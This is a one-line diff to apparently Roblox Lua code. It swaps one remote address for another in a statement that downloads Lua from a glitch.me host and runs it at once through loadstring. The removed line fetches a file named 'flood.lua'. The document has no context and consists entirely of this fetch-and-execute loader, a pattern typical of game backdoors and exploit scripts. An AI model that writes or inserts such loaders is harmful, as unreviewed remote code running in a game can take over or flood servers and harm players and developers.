@@ -1,1 +1,1 @@
-loadstring(game:GetService("HttpService"):GetAsync("https://tosss.glitch.me/flood.lua"))()
+loadstring(game:GetService("HttpService"):GetAsync("https://tosscoal-rblxgames.glitch.me"))()
